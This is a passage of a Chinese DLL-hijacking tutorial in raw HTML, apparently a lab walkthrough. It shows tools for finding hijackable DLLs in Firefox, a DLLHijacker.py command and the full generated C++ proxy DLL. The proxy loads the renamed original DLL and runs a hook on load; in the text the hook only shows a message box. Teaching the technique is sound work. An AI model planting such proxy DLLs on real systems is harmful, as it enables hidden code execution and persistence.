hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">1、一般来说，我们可以使用ProcessExplorer、ProcessMonitor，再结合者注册表KnownDLLs即可分析，可能存在DLL劫持的漏洞。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">ProcessExplorer：</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.53671875" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/9_c79SBicEMTclWRYH0sgSkwxDSNibEQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4KunMltSrfebSep8EczF3VtXyERic79SBicEMTclWRYH0sgSkwxDSNibEQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">ProcessMonitor：</span><span style="font-size:15px;line-height:35px;;"></span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.6876061120543294" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/10_JB0ZW7FXkib5PaYeo27OnD0DU9eC5g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4lEa8MtibBfIb2T32JuhXF55YqJJB0ZW7FXkib5PaYeo27OnD0DU9eC5g/640?wx_fmt=png'" data-type="png" data-w="1178" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">2、当然，也存在懒的方法，比如使用 Rattler_x64.exe 这个工具。</span></p><figure class="highlight cmd" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="720" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">F:\提权工具包\8<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">_</span>权限维持相关工具\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">rattler</span>&gt;<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">Rattler_x64.exe</span> "<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">D</span>:\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">Firefox</span>\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">firefox</span>\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">firefox.exe</span>" 1</span><br  /></pre></td></tr></tbody></table></figure><p style="text-align: center;"><img class="rich_pages" data-ratio="0.6713000817661489" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/11_x0mIXO1YicWqox0icFAuvRZ3eEYqBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4eBjMRgRMk7ibtnMP37SVv3lgpRxx0mIXO1YicWqox0icFAuvRZ3eEYqBg/640?wx_fmt=png'" data-type="png" data-w="1223" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">注：</span><span style="font-size:15px;line-height:35px;;">使用该工具，测试软件路径不能有中文。</span><br  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x08 本地测试DLL劫持</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">1、这里，我使用 DLLHi_jacker.py 这款工具。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">2、我们把上面使用的 shiyan_dll 文件，放到工具同目录中，然后执行下面的语句：</span></p><figure class="highlight cmd" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="992" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">F:\提权工具包\8<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">_</span>权限维持相关工具\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">DLLHi_jacker</span>&gt;<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">python2</span> <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">DLLHi_jacker.py</span> <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">F</span>:\提权工具包\8<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">_</span>权限维持相关工具\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">DLLHi_jacker</span>\<span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">shiyan_dll.dll</span></span><span style="color: rgb(38, 139, 210);height: 20px;font-size:15px;line-height:35px;;"></span><br  /></pre></td></tr></tbody></table></figure><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">3、然后就会在目录下生成 shiyan_dll.cpp 文件，内容如下：</span></p><figure class="highlight c++" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="720" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">2</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">3</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">4</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">5</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">6</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">7</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">8</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">9</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">10</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">11</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">12</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">13</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">14</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">15</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">16</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">17</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">18</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">19</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">20</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">21</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">22</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">23</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">24</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">25</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">26</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">27</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">28</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">29</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">30</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">31</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">32</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">33</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">34</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">35</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">36</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">37</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">38</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">39</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">40</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">41</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">42</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">43</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">44</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">45</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">46</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">47</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">48</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">49</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">50</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">51</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">52</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">53</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">54</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">55</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">56</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">57</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">58</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">59</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">60</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">61</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">62</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">63</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">64</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">65</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">66</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">67</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">68</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">69</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">70</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">71</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">72</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">73</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">74</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">//Generate by DLLHijacker.py</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">#include &lt;Windows.h&gt;</span></span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">#pragma comment(linker, "/EXPORT:add=_DLLHijacker_add,@1")</span></span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">#define EXTERNC extern "C"</span></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define NAKED __declspec(naked)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define EXPORT __declspec(dllexport)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define ALCPP EXPORT NAKED</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define ALSTD EXTERNC EXPORT NAKED void __stdcall</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define ALCFAST EXTERNC EXPORT NAKED void __fastcall</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define ALCDECL EXTERNC NAKED void __cdecl</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"><span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">namespace</span> DLLHijacker</span></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    HMODULE m_hModule = <span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    DWORD m_dwReturn[<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">17</span>] = {<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">0</span>};</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">inline</span> BOOL WINAPI <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">Load</span>()</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        TCHAR tzPath[MAX_PATH];</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        lstrcpy(tzPath, TEXT(<span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"shiyan_dll.dll"</span>));</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        m_hModule = LoadLibrary(tzPath);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (m_hModule == <span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">return</span> FALSE;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">return</span> (m_hModule != <span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">inline</span> VOID WINAPI <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">Free</span>()</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (m_hModule)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">            FreeLibrary(m_hModule);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">FARPROC WINAPI <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">GetAddress</span>(PCSTR pszProcName)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        FARPROC fpAddress;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        CHAR szProcName[<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">16</span>];</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        fpAddress = GetProcAddress(m_hModule, pszProcName);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (fpAddress == <span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (HIWORD(pszProcName) == <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">0</span>)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">            {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">                wsprintf(szProcName, <span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"%d"</span>, pszProcName);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">                pszProcName = szProcName;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">            }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">            ExitProcess(<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">-2</span>);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">return</span> fpAddress;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">}</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">using</span> <span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">namespace</span> DLLHijacker;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">VOID <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">Hijack</span>()</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    MessageBoxW(<span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>, <span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">L"DLL Hijack! by DLLHijacker"</span>, <span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">L":)"</span>, <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">0</span>);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">}</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">BOOL WINAPI <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">DllMain</span>(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        DisableThreadLibraryCalls(hModule);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span>(Load())</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">            Hijack();</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">else</span> <span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    {</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        Free();</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    }</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">return</span> TRUE;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">}</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">ALCDECL <span class="title" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">DLLHijacker_add</span>(<span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">void</span>)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">        __asm POP m_dwReturn[<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">0</span> * TYPE <span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">long</span>];</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    GetAddress(<span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"add"</span>)();</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">    __asm JMP m_dwReturn[<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">0</span> * TYPE <span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">long</span>];</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">}</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">4、然后我们参照着 0x04 把上述代码，编译成新的dll，不过有四点需要注意。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">5、该cpp文件，头部添加 #include “stdafx.h” 。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">6、代码第22行，lstrcpy(tzPath, TEXT(“shiyan_dll.dll”)); 中，dll文件名，可以修改成其他的，这里我修改为 shiyan_dll_ys.dll</span></p><p 